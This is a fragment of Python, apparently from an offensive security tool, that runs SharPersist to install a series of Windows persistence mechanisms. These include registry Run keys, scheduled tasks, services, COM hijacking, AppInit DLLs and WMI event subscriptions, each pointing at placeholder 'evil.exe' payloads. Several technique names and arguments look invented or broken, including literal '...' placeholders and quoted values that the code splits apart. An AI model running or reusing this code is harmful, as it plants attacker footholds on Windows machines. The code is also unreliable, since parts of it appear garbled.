        sp = self._paths.get("sharpersist")
        if not sp:
            return {"error": "sharpersist not installed"}
        # All persistence methods
        methods = [
            ("registry", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
             "-f cmd.exe -t registry -k ... -v evil -d cmd.exe"),
            ("scheduled_task", "-f cmd.exe -t scheduled_task -c 'cmd.exe' "
             "-n TaskName -m monthly -tr 1"),
            ("startup_folder", "-f cmd.exe -t startupfolder -c cmd.exe"),
            ("service", "-f evil.exe -t service -c evil.exe -m service"),
            ("com_hijack", "-f evil.exe -t com -m com_hijack "
             "-k HKCU\\Software\\Classes\\CLSID\\..."),
            ("activex", "-f evil.exe -t activex -m activex"),
            ("appinit_dlls", "-f evil.dll -t appinit -k ... -m appinit"),
            ("files", "-f evil.exe -t files -c 'cmd.exe' -d C:\\Windows\\ "
             "-r 1"),
            ("iffile", "-f evil.exe -t ifile -c 'cmd.exe' -f evil.exe"),
            ("diskeep", "-f evil.exe -t diskeep -c 'cmd.exe'"),
            ("wmi_event_sub", "-f evil.exe -t wmi -m wmi_event "
             "-c 'cmd.exe' -n EventFilter"),
        ]
        for name, args in methods:
            cmd = [sp] + args.split()
            r = self._run(cmd, timeout=120)
            out = r.get("stdout", "") + r.get("stderr", "")
            if "[+] Persistence" in out or "Added" in out:
                self._add(f"SharPersist — {name} Persistence Installed",
                          out, "CRITICAL")
